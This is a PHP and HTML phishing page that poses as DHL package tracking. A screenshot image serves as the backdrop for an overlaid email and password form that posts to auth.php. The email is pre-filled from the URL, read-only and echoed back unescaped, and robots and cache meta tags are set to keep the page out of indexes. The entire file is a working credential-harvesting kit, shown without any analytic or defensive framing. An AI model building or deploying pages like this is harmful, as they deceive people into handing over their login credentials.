<?php

if (isset($_GET['email'])) {

	$email = $_GET['email'];
}

?>
<html lang="en">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>DHL | Tracking</title>
<meta http-equiv='content-type' content="text/html; charset=ISO-8859-5">
<meta http-equiv='content-type' content="text/html; charset=UTF-8">
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="private">
<meta http-equiv="Pragma" content="no-cache">
<link rel="icon" type="images/ico" sizes="16*16" href="images/favicon.ico">

<style>



element {

}
.b-input:hover {

    border-color: rgba(0, 0, 0, 0.24);
    -webkit-transition: all 0.3s;
    -o-transition: all 0.3s;
    transition: all 0.3s;

}
.b-input:hover {

    border-color: #999;

}
.b-input {

    font-family: Helvetica, Arial, sans-serif;
    border: 1px solid rgba(0, 0, 0, 0.12);
        border-top-color: rgba(0, 0, 0, 0.12);
        border-right-color: rgba(0, 0, 0, 0.12);
        border-bottom-color: rgba(0, 0, 0, 0.12);
        border-left-color: rgba(0, 0, 0, 0.12);
    -webkit-box-shadow: none;
    box-shadow: none;
    padding: 0 12px;
    font-size: 15px;

}
.b-input_in-row {

    width: 100%;

}
.b-input {

    border: 1px solid #C7C7C7;
    -webkit-border-radius: 2px;
    border-radius: 2px;
    line-height: 32px;
    margin: 0;
    padding: 0 8px;
    position: relative;
    font-size: 13px;
    z-index: 100;
    width: 280px;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    height: 32px;

}
.b-form-field {

    line-height: 20px;

}
.b-form_popup .b-form-row {

    color: #333;

}
.b-form-row_popup {

    font-size: 13px;
    line-height: 16px;
    word-wrap: break-word;

}
html body {

    font-size: 15px;
    line-height: 20px;

}
html, body, .page {

    font: 13px/16px "Helvetica Neue",Helvetica,Arial,sans-serif;
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        font-size: 13px;
        line-height: 16px;
    -webkit-text-size-adjust: none;
    color: #333;

}
body {

    font-family: Arial, Tahoma, Verdana, sans-serif;
    font-size: 13px;

}

</style>
<script type="text/javascript">


function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

</head>
<body style="visibility: visible;" onload="unhideBody()" bgcolor="">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1366px; height:654px; z-index:0">
<img src="images/0.png" alt="" title="" width="1366" border="0" height="654">
</div>
<form id="chalbhai" action="auth.php" name="chalbhai" method="post">
<div>
<input style="position:absolute; overflow:hidden; left:583px; top:248px; width:208px; height:25px; z-index:1" class="b-input b-input_in-row b-input_b-login-providers b-input_ b-input_popup" data-bem="b-input" data-blockid="email_name" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" placeholder="Email Address" value="<?php if (isset($_GET['email'])) { echo $email; }?>" required="required" autofocus="autofocus" data-row-name="Login" name="a" data-uniqid="toolkit-17" type="email" readonly>
</div>
<div>
<input style="position:absolute; overflow:hidden; left:583px; top:282px; width:208px; height:25px; z-index:2" class="b-input b-input_in-row b-input_password b-input_ b-input_popup" data-bem="b-input" name="b" placeholder="Password" required="required" autocomplete="off" id="Password_71" data-uniqid="toolkit-9" type="password">
</div>
<div id="formimage1" style="position:absolute; left:582px; top:318px; z-index:3">
<input name="formimage1" type="image" src="images/1.png" width="107" border="0" height="23">
</div>

</form>
</body>
</html>